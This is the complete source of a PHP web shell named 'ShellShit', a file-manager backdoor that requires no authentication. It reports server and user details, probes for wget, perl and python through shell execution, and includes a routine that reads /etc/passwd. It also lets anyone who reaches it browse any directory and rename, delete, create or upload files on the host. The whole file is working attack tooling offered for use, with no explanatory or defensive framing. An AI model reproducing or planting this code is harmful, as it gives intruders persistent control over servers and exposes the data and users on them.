
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
	<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
	<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" integrity="sha384-w1Q4orYjBQndcko6MimVbzY0tgp4pWB4lZ7lr30WKz0vr/aWKhXdBNmNb5D92v7s" crossorigin="anonymous"></script>

    <title>ShellShit By RamzDevlab</title>

	<style>
		a{
			color : white;
			text-decoration: none;
		}a:hover{
			text-decoration: none;
			color : green;
		}

	</style>
</head>
<body class="bg-dark">
<?php


// FUNCTIONS =================================================

function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}


function hddsize($size) {
	if($size >= 1073741824)
		return sprintf('%1.2f',$size / 1073741824 ).' GB';
	elseif($size >= 1048576)
		return sprintf('%1.2f',$size / 1048576 ) .' MB';
	elseif($size >= 1024)
		return sprintf('%1.2f',$size / 1024 ) .' KB';
	else
		return $size .' B';
}

function hdd() {
	$hdd['size'] = hddsize(disk_total_space("/"));
	$hdd['free'] = hddsize(disk_free_space("/"));
	$hdd['used'] = hddsize(disk_total_space("/") - disk_free_space("/"));
	return (object) $hdd;
}


function usergroup() {
	if(!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}

function getuser() {
	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
	while($read = fgets($fopen)) {
		preg_match_all('/(.*?):x:/', $read, $getuser);
		$user[] = $getuser[1][0];
	}
	return $user;
}


function filepermission($file){
	$perms = fileperms($file);

	switch ($perms & 0xF000) {
		case 0xC000: // socket
			$info = 's';
			break;
		case 0xA000: // symbolic link
			$info = 'l';
			break;
		case 0x8000: // regular
			$info = 'r';
			break;
		case 0x6000: // block special
			$info = 'b';
			break;
		case 0x4000: // directory
			$info = 'd';
			break;
		case 0x2000: // character special
			$info = 'c';
			break;
		case 0x1000: // FIFO pipe
			$info = 'p';
			break;
		default: // unknown
			$info = 'u';
	}

	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
			(($perms & 0x0800) ? 's' : 'x' ) :
			(($perms & 0x0800) ? 'S' : '-'));

	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
		    	(($perms & 0x0400) ? 's' : 'x' ) :
			(($perms & 0x0400) ? 'S' : '-'));

	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
       		        (($perms & 0x0200) ? 't' : 'x' ) :
			(($perms & 0x0200) ? 'T' : '-'));
	
	return $info;
	
}


function delDir($dir) { 
	$files = array_diff(scandir($dir), array('.','..')); 
	 foreach ($files as $file) { 
	   (is_dir("$dir/$file")) ? delDir("$dir/$file") : unlink("$dir/$file"); 
	 } 
	 return rmdir($dir); 
} 


// END FUNCTIONS ==================================================

$serverhost =  $_SERVER['HTTP_HOST'];



?>
	<div class="container">
		<table>
			<tr>
				<td><img src="https://1.bp.blogspot.com/-FWB7KaG6jV4/X_0cXca7uKI/AAAAAAAADOk/NtNe4wjiUBwsOc3nKQiOweXVxHaaKNI4gCLcBGAsYHQ/s320/shithe.png" style="width: 70px"></td>
				<td><h1 class="mt-5 mb-5 text-danger font-weight-bold">< ShellShit <span class="text-light">RamzDevLab</span> /></h1></td>
			</tr>
		</table>
		
		<table class="table table-sm table-borderless">
			<tr>
				<td class="text-light font-weight-bold">Server Name</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo $serverhost; ?></td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">System</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo php_uname(); ?></td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">HardDrive</td>
				<td class="text-light">:</td>
				<td class="text-primary">
					<table>
						<tr>
							<td><b>USED</b></td>
							<td><?php echo hdd()->used; ?></td>
							<td><b>SIZE</b></td>
							<td><?php echo hdd()->size; ?></td>
							<td><b>FREE</b></td>
							<td><?php echo hdd()->free; ?></td>
						</tr>
					</table>
				</td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">User/Group</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo usergroup()->name." (". usergroup()->uid .") / ".usergroup()->group." (". usergroup()->uid . ")"; ?></td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">Web Server</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo str_replace('/', ' ', explode(' ', $_SERVER['SERVER_SOFTWARE'])[0]) ?></td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">PHP Version</td>
				<td class="text-light">:</td>
				<td class="text-primary"><?php echo phpversion(); ?></td>
			</tr>
			<tr>
				<td class="text-light font-weight-bold">Installed Library</td>
				<td class="text-light">:</td>
				<td class="text-primary">
					<table >
						<tr>
							<td>
								<?php 
									if (function_exists('mysql_connect')) {
										echo "<li class='text-success'>MYSQL</li>";
									}else{
										if(function_exists('mysqli_connect')){
											echo "<li class='text-success'>MYSQL</li>";
										}else{
											echo "<li class='text-danger'>MYSQL</li>";
										}
									}
								 ?>
							</td>
							<td>
								<?php 
									if (function_exists('curl_init')) {
										echo "<li class='text-success'>cURL</li>";
									}else{
										echo "<li class='text-danger'>cURL</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (exec('python -V')) {
										echo "<li class='text-success'>Python</li>";
									}else{
										echo "<li class='text-danger'>Python</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (exec('wget --help')) {
										echo "<li class='text-success'>Wget</li>";
									}else{
										echo "<li class='text-danger'>Wget</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (shell_exec('perl --help')) {
										echo "<li class='text-success'>Perl</li>";
									}else{
										echo "<li class='text-danger'>Perl</li>";
									}
								 ?>
							</td>
							<td>
								<?php 
									if (shell_exec('git --help')) {
										echo "<li class='text-success'>Git</li>";
									}else{
										echo "<li class='text-danger'>Git</li>";
									}
								 ?>
							</td>
						</tr>
					</table>
					
				</td>
			</tr>
		</table>
		

		<?php

		//RENAME FILE
			if(isset($_POST['newfilename'], $_POST['oldfilename'])){
				rename($_POST['oldfilename'], $_POST['newfilename']);
				?>
						<div class="alert alert-warning alert-dismissible fade show" role="alert">
						  <strong>Done !</strong> Filename Changed Successful !.
						  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
						    <span aria-hidden="true">&times;</span>
						  </button>
						</div>
				<?php
				
			}
		//DELETE FILE
			elseif(isset($_POST['filedelete'], $_POST['path'])){
				if(isset($_GET['dir'])){
					if(filetype($_POST['path']) == 'file'){
						unlink($_POST['path']);
					}else{
						delDir($_POST['path']);
					}
				}else{
					if(filetype($_POST['path']) == 'file'){
						unlink($_POST['path']);
					}else{
						delDir($_POST['path']);
					}
				}
				
				?>
						<div class="alert alert-danger alert-dismissible fade show" role="alert">
						  <strong>Done !</strong>File/Dir Deleted Successful !.
						  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
						    <span aria-hidden="true">&times;</span>
						  </button>
						</div>
				<?php
			}
		//MAKE NEW FILE OR DIR
			elseif(isset($_POST['newopsi'], $_POST['makefile'] )){
				$opsi = $_POST['newopsi'];
				if(isset($_GET['dir'])){
					if($opsi == 'File'){
						fopen($_GET['dir'].'/'.$_POST['makefile'], "w");
					}elseif($opsi == 'Directory'){
						mkdir($_GET['dir'].'/'.str_replace("'", "", $_POST['makefile']), 0777, true);
					}
				}else{
					if($opsi == 'File'){
						fopen($_POST['makefile'], "w");
					}elseif($opsi == 'Directory'){
						mkdir(str_replace("'", "", $_POST['makefile']), 0777, true);
					}
				}
			
				?>
						<div class="alert alert-success alert-dismissible fade show" role="alert">
						  <strong>Done !</strong>File/Dir Created Successful !.
						  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
						    <span aria-hidden="true">&times;</span>
						  </button>
						</div>
				<?php
			}
			//UPLOAD FILE 
			elseif(!empty($_FILES['fileUpload']))
			{
				$path = $_GET['dir'];
				$path = $path .'/'. basename( $_FILES['fileUpload']['name']);
				//echo $path;
				if(move_uploaded_file($_FILES['fileUpload']['tmp_name'], $path)) {
				echo "<span class='text-success mb-3 mt-3'>The file ".  basename( $_FILES['fileUpload']['name']). 
				" has been uploaded </span>";
				} else{
					echo "<span class='text-danger mb-3 mt-3'> * There was an error uploading the file, please try again!</span>";
				}
			}
		
		?>		
		
		<table>
			<tr>
				<td>
					<!-- MAKE NEW FILE -->
					<button type="button" class="btn btn-sm btn-primary mb-4" data-toggle="modal" data-target="#makeadd">
					  Make File / Dir 
					</button>

					<!-- Modal -->
					<div class="modal fade" id="makeadd" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
					  <div class="modal-dialog">
					    <div class="modal-content">
					      <div class="modal-header">
						<h5 class="modal-title" id="exampleModalLabel">Make New File</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
						  <span aria-hidden="true">&times;</span>
						</button>
					      </div>
					      <div class="modal-body">
						
					      <form method="POST">
						<label>Choose Option </label>
						<select class="form-control mb-3" name="newopsi">
						  <option>File</option>
						  <option>Directory</option>
						</select>
						<label>File / Dir Name </label>
						<input type="text" class="form-control" name="makefile" placeholder="Enter File / Dir Name"/>
						</div>
						<div class="modal-footer">
						<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
						<button type="submit" class="btn btn-primary">Save</button>
						</form>
					      </div>
					    </div>
					  </div>
					</div>
				</td>
				<td>
					<!-- UPLOAD FILE -->
					<button type="button" class="btn btn-sm btn-success mb-4" data-toggle="modal" data-target="#uploadfile">
					  Upload File
					</button>

					<!-- Modal -->
					<div class="modal fade" id="uploadfile" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
					  <div class="modal-dialog">
					    <div class="modal-content">
					      <div class="modal-header">
						<h5 class="modal-title" id="exampleModalLabel">Upload File</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
						  <span aria-hidden="true">&times;</span>
						</button>
					      </div>
					      <div class="modal-body">
							<form action="" method="post" enctype="multipart/form-data">
							<input type="file" name="fileUpload" class="form-control">
							<input type="hidden" name="path" value="<?php echo $_GET['dir']?>">
					      </div>
					      <div class="modal-footer">
						<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
						<button type="submit" class="btn btn-primary">Upload</button>
						</form>
					      </div>
					    </div>
					  </div>
					</div>
				</td>
			</tr>		
		</table>
		
		
	

		<table class="table table-sm table-bordered">
			<tr class="text-light bg-danger font-weight-bold">
				<td>Name</td>
				<td>Type</td>
				<td>Size</td>
				<td>Last Modified</td>
				<td>Owner/Group</td>
				<td>Permission</td>
				<td>Option</td>
			</tr>
			<?php 
			
			$directory = scandir(path());
			
			foreach($directory as $data){
				
				?>
					<tr class="text-light">
						<td><a href="?dir=<?php echo realpath($data.'/'); ?>"><?php echo $data; ?></a></td>
						<td><?php echo filetype($data); ?></td>
						<td><?php echo filesize($data); ?></td>
						<td><?php echo date ("F, d Y H:i:s",filemtime($data)); ?></td>
						<td><?php echo posix_getpwuid(fileowner($data))['name'].'/'.posix_getpwuid(filegroup($data))['name']; ?></td>
						<td><?php echo filepermission($data);?></td>
						<td>
							<?php
								if($data == '.' OR $data == '..'){

								}else{
									?>
									<!-- RENAME OPTION -->
							<button type="button" class="btn btn-primary btn-sm" data-toggle="modal" data-target="#exampleModal<?php echo str_replace('.', 'AABB', 									$data);?>">Rename
							</button>
							<!-- Modal Rename File -->
							<div class="modal fade" id="exampleModal<?php echo str_replace('.', 'AABB', $data); ?>" tabindex="-1" aria-labelledby="exampleModalLabel" 										aria-hidden="true">
							  <div class="modal-dialog">
								<div class="modal-content text-dark">
								  <div class="modal-header">
								<h5 class="modal-title text-dark" id="exampleModalLabel">Rename <?php echo filetype($data); ?></h5>
								<button type="button" class="close" data-dismiss="modal" aria-label="Close">
								  <span aria-hidden="true">&times;</span>
								</button>
								  </div>
								  <div class="modal-body">
								<form method="POST">
									<label>File Name</label>
									<input type="text" class="form-control mb-3" name="oldfilename" value="<?php echo $data; ?>" readonly/>
									<label>New File Name</label>
									<input type="text" class="form-control" name="newfilename" placeholder="Enter New File Name"/>
									<input type="hidden" name="path" value="<?php echo realpath($data.'/')?>">
								  </div>
								  <div class="modal-footer">
								<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
								<button type="submit" class="btn btn-primary">Save changes</button>
								</form>
								  </div>
								</div>
							  </div>
							</div>


							


							<!-- DELETE OPTION -->
							<button type="button" class="btn btn-danger btn-sm" data-toggle="modal" data-target="#delete<?php 
							$allowed = array("A11", "B12"); 
							$notallowed = array(" ", ".");  
							echo str_replace($notallowed, $allowed, $data);
							?>">Delete
							</button>
							<!-- Modal Delete File -->
							<div class="modal fade" id="delete<?php 
							$allowed = array("A11", "B12"); 
							$notallowed = array(" ", ".");  
							echo str_replace($notallowed, $allowed, $data);
							?>" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
							  <div class="modal-dialog">
								<div class="modal-content text-dark">
								  <div class="modal-header">
								<h5 class="modal-title text-dark" id="exampleModalLabel">Warning !</h5>
								<button type="button" class="close" data-dismiss="modal" aria-label="Close">
								  <span aria-hidden="true">&times;</span>
								</button>
								  </div>
								  <div class="modal-body">
								<p>Will you delete this <?php echo filetype($data); ?> ?</p>
								<form method="POST">
									<input type="hidden" name="filedelete" value="<?php echo $data; ?>"/>
									<input type="hidden" name="path" value="<?php echo realpath($data)?>">	
								  </div>
								  <div class="modal-footer">
								<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
								<button type="submit" class="btn btn-danger">Continue</button>
								</form>
								  </div>
								</div>
							  </div>
							</div>
							<?php
							if(filetype($data) == 'file'){
								?>
								<!-- EDIT OPTION -->
								<button type="button" class="btn btn-success btn-sm" data-toggle="modal" data-target="#edit<?php echo str_replace('.', 'AABB', $data);?>">Edit
								</button>
								<!-- Modal Rename File -->
								<div class="modal fade" id="edit<?php echo str_replace('.', 'AABB', $data); ?>" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
								<div class="modal-dialog">
									<div class="modal-content text-dark">
									<div class="modal-header">
									<h5 class="modal-title text-dark" id="exampleModalLabel">Edit File</h5>
									<button type="button" class="close" data-dismiss="modal" aria-label="Close">
									<span aria-hidden="true">&times;</span>
									</button>
									</div>
									<div class="modal-body">
									<form method="POST">
										<textarea rows="20" cols="" class="form-control" name="newtext">
											<?php
												$file = fopen($data, "r+");
												
											?>
										</textarea>	
									</div>
									<div class="modal-footer">
									<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
									<button type="submit" class="btn btn-danger">Continue</button>
									</form>
									</div>
									</div>
								</div>
								</div>
								
								<?php
							}
							
							
								}
							
							?>
							
						</td>
					</tr>
				<?php
			}
			

			?>
		</table>
		


	</div>
</body>
</html>
